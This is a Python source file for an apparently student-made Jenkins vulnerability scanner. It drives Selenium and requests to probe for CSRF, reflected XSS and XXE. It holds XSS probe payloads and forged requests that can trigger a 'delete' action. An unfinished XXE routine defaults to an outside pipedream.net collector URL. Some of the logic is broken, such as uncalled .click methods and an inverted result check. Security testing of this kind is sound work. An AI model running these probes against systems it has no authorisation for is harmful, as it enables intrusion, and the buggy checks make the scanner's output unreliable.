from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
import pandas as pd
import requests as req
from src.func import *
from tqdm import tqdm


#@ todo xxe 추가해야함
def xxe_on_build_after_option(chrome, url, port, path, response_server="https://eozqaulxtdlixhg.m.pipedream.net/xxe"):
    target = f"http://{url}:{port}/{path}"
    chrome.get(target)
    chrome.script("window.scrollTo(0,document.body.scrollHeight)")
    #최 하단으로 스크롤 내림 그래야 클릭해줌
    build_menu = chrome.find_element(By.XPATH, '//*[@id="yui-gen57-button"]').get_attribute()

    for itm in build_menu:
        print(f"--------------------------빌드 옵션 = {itm}----------------------------")
        chrome.find_element(By.XPATH,f'//*[@id="yui-gen57-button"]/option[text()="{itm}"]').click
        # 빌드 후 조치 클릭

        chrome.find_element(By.XPATH, f'//*[@id="yui-gen114-button"]/option[text()="{itm}"]').click
        break
    #//*[@id="yui-gen55-button"] => 드롭다운 메뉴버튼


def Csrf_protection_check(chrome, url, port, id, pw, path, action, value, value_type):
    try:
        uri = f"http://{url}:{port}{path}"
        chrome.get(uri)
        print("접속 시도")
        login(chrome,id,pw,"not first")
        sleep(1)
    except:
        print("접속중.....")

    try:
        info = []
        with open("user_info.txt", "r") as user:
            info = user.readlines()

    except:
        print("유저 에이전트 정보를 위한 파일이 필요합니다. user_info.txt를 생성하고 구글에 my user agent를 쳐서 나온 값을 파일에 넣어 주세요")

    user_agent = info[0]

    #EXPLOIT!
    if value=="input":
        if "name" in value_type:
            key= value_type[6:]
            value = "delete"

    else:
        key, value = "submit", "wawawawawawa"

    not_valid_key = ['Jenkins-Crumb']

    if key not in not_valid_key:
    #세션을 가져옴
        session = get_session(chrome, user_agent)
        payload = action
        if "http" not in payload:
            payload = uri+payload
        exploit_data = {key:value}

        #파라미터 날려보고 response 받음, 근데 delete같이 페이지를 삭제하면 404떠서 dummy값 날림
        response = session.get(payload+'/', params=exploit_data)
        sleep(1)

        return key, value, response

    else:
        print("Skip")
        return 0,0,0

def xss_sidevar_point():
    #@todo 소연이가 만든거 붙이기
    print("will be mearge")


def xss_reflected_all_param(url, id, pw, vm_num):
    file_name = f"Scanning_all_param_result_vm{vm_num}_{id}.csv"
    csv_data = pd.read_csv(f"./csv/{file_name}")

    url = f"http://{url}"

    get_Path_list = csv_data['Path'].to_list()
    path_list = []
    parameter_list = {}
    for i in range(len(get_Path_list)):
        path_list.append(get_Path_list[i])
        path_list = list(set(path_list))
        #path_list = ['/manage']

    for i in range(len(path_list)):
        parameter_list[path_list[i]] = csv_data[csv_data['Path'] == path_list[i]]['Parameter'].to_list()
        #parameter_list = {'path':[], 'path2':[]}

    cheatsheet = [
        "<img src='x' onerror='alert(1)'",
        "<script>alert(1)</script>"
    ]

    ignore_param_list = [
        'Jenkins-Crumb',
        'json'
    ]
    with open("./user_info.txt") as u_info:
        user_agent = u_info.readlines()[0]

    session = req.session()
    headers = {
        "User-Agent" : user_agent
    }
    session.headers.update(headers)
    login_data = {
        "j_username": id,
        "j_password": pw,
        "from" : "/",
        "Submit" : ""
    }
    session.post(url, data = login_data)

    #결과물 출력
    result_file_low = []

    for path in tqdm(path_list):
        for param in parameter_list[path]:
            if param not in ignore_param_list:
                for query in cheatsheet:
                    try:
                        payload = f"{url}{path}?{param}={query}"
                        res = session.get(payload)
                        if res.status_code!=200:
                            if query in res.text:
                                result_file_low += [url,id,path,param,query]
                        else:
                            continue
                    except:
                        pass
    return result_file_low
